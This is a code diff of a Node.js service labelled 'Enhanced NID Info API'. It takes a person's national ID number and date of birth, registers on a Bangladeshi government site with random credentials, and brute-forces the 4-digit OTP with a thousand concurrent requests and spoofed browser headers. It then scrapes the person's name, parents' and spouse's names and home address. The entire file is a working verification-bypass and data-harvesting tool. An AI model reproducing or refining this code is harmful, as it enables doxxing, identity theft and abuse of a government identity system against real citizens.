@@ -11,17 +11,17 @@ app.use(express.json());
 
 // Configuration
 const MOBILE_PREFIX = "019";
-const MAX_CONCURRENT = 1000; // Ultra-fast concurrency
+const MAX_CONCURRENT = 1000; // আল্ট্রা ফাস্ট concurrency
 const TARGET_LOCATION = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form";
 
 const BASE_HEADERS = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'Accept-Encoding': 'gzip, deflate, br, zstd',
     'Cache-Control': 'max-age=0',
     'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Windows"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
     'Origin': 'https://fsmms.dgf.gov.bd',
     'Upgrade-Insecure-Requests': '1',
     'Sec-Fetch-Site': 'same-origin',
@@ -54,24 +54,26 @@ async function getSessionAndBypass(nid, dob, mobile, password) {
     const headers = { ...BASE_HEADERS, 'Content-Type': 'application/x-www-form-urlencoded', 'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/movementContractor' };
     const data = { nidNumber: nid, email: "", mobileNo: mobile, dateOfBirth: dob, password, confirm_password: password, next1: "" };
 
-    const res = await axios.post(url, data, { maxRedirects: 0, validateStatus: null, headers, timeout: 0 });
+    const res = await axios.post(url, data, { maxRedirects: 0, validateStatus: null, headers });
     if (res.status === 302 && res.headers.location.includes('mov-verification')) {
         const cookies = res.headers['set-cookie'] || [];
-        return { session: axios.create({ headers: { ...BASE_HEADERS, 'Cookie': cookies.join('; ') }, timeout: 0 }), cookies };
+        return { session: axios.create({ headers: { ...BASE_HEADERS, 'Cookie': cookies.join('; ') } }), cookies };
     }
     throw new Error('Bypass Failed - Check NID and DOB');
 }
 
-// Ultra-fast OTP check
+// Ultra-fast OTP check with concurrency control
 async function tryBatch(session, cookies, otpRange) {
     let found = null;
     const queue = [...otpRange];
 
+    // Shuffle OTPs for randomness
     for (let i = queue.length - 1; i > 0; i--) {
         const j = Math.floor(Math.random() * (i + 1));
         [queue[i], queue[j]] = [queue[j], queue[i]];
     }
 
+    // Worker function
     const worker = async () => {
         while (queue.length > 0 && !found) {
             const otp = queue.pop();
@@ -79,7 +81,7 @@ async function tryBatch(session, cookies, otpRange) {
                 const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step';
                 const headers = { ...BASE_HEADERS, 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': cookies.join('; '), 'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification' };
                 const data = { otpDigit1: otp[0], otpDigit2: otp[1], otpDigit3: otp[2], otpDigit4: otp[3] };
-                const res = await session.post(url, data, { maxRedirects: 0, validateStatus: null });
+                const res = await session.post(url, data, { maxRedirects: 0, validateStatus: null, headers });
                 if (res.status === 302 && res.headers.location.includes(TARGET_LOCATION)) {
                     found = otp;
                     break;
@@ -88,6 +90,7 @@ async function tryBatch(session, cookies, otpRange) {
         }
     };
 
+    // Start MAX_CONCURRENT workers
     const workers = Array.from({ length: MAX_CONCURRENT }, () => worker());
     await Promise.all(workers);
 
@@ -106,7 +109,7 @@ async function fetchFormData(session, cookies) {
 function extractFields(html, ids) {
     const result = {};
     ids.forEach(id => {
-        const match = html.match(new RegExp(<input[^>]*id="${id}"[^>]*value="([^"]*)", 'i'));
+        const match = html.match(new RegExp(`<input[^>]*id="${id}"[^>]*value="([^"]*)"`, 'i'));
         result[id] = match ? match[1] : "";
     });
     return result;
@@ -133,14 +136,14 @@ function enrichData(contractor_name, result, nid, dob) {
         post_office: result.nidPerPostOffice || ""
     };
     const addr_parts = [
-        বাসা/হোল্ডিং: ${result.nidPerHolding || '-'},
-        গ্রাম/রাস্তা: ${result.nidPerVillage || ''},
-        মৌজা/মহল্লা: ${result.nidPerMouza || ''},
-        ইউনিয়ন ওয়ার্ড: ${result.nidPerUnion || ''},
-        ডাকঘর: ${result.nidPerPostOffice || ''} - ${result.nidPerZipCode || ''},
-        উপজেলা: ${result.nidPerUpazila || ''},
-        জেলা: ${result.nidPerDistrict || ''},
-        বিভাগ: ${result.nidPerDivision || ''}
+        `বাসা/হোল্ডিং: ${result.nidPerHolding || '-'}`,
+        `গ্রাম/রাস্তা: ${result.nidPerVillage || ''}`,
+        `মৌজা/মহল্লা: ${result.nidPerMouza || ''}`,
+        `ইউনিয়ন ওয়ার্ড: ${result.nidPerUnion || ''}`,
+        `ডাকঘর: ${result.nidPerPostOffice || ''} - ${result.nidPerZipCode || ''}`,
+        `উপজেলা: ${result.nidPerUpazila || ''}`,
+        `জেলা: ${result.nidPerDistrict || ''}`,
+        `বিভাগ: ${result.nidPerDivision || ''}`
     ];
     const filtered = addr_parts.filter(p => p.split(": ")[1] && p.split(": ")[1].trim() && p.split(": ")[1] !== "-");
     mapped.permanentAddress = filtered.join(", ");
@@ -172,12 +175,7 @@ app.get('/get-info', async(req, res) => {
         if (!foundOTP) return res.status(404).json({ success: false, error: "OTP not found" });
 
         const html = await fetchFormData(session, cookies);
-        const ids = [
-            "contractorName","fatherName","motherName","spouseName",
-            "nidPerDivision","nidPerDistrict","nidPerUpazila","nidPerUnion",
-            "nidPerVillage","nidPerWard","nidPerZipCode","nidPerPostOffice",
-            "nidPerHolding","nidPerMouza"
-        ];
+        const ids = ["contractorName","fatherName","motherName","spouseName","nidPerDivision","nidPerDistrict","nidPerUpazila","nidPerUnion","nidPerVillage","nidPerWard","nidPerZipCode","nidPerPostOffice","nidPerHolding","nidPerMouza"];
         const extracted = extractFields(html, ids);
         const finalData = enrichData(extracted.contractorName || "", extracted, nid, dob);
 
@@ -188,12 +186,8 @@ app.get('/get-info', async(req, res) => {
     }
 });
 
-app.get('/health', (req, res) => {
-    res.json({ status: 'OK', timestamp: new Date().toISOString(), service: 'Enhanced NID Info API', version: '2.1.0' });
-});
+app.get('/health', (req, res) => res.json({ status: 'OK', timestamp: new Date().toISOString(), service: 'Enhanced NID Info API', version: '2.0.4' }));
 
-app.get('/test-creds', (req, res) => {
-    res.json({ mobile: randomMobile(MOBILE_PREFIX), password: randomPassword(), note: 'Random test credentials' });
-});
+app.get('/test-creds', (req, res) => res.json({ mobile: randomMobile(MOBILE_PREFIX), password: randomPassword(), note: 'Random test credentials' }));
 
-app.listen(PORT, () => console.log(🚀 API running on port ${PORT}));
+app.listen(PORT, () => console.log(`🚀 API running on port ${PORT}`));
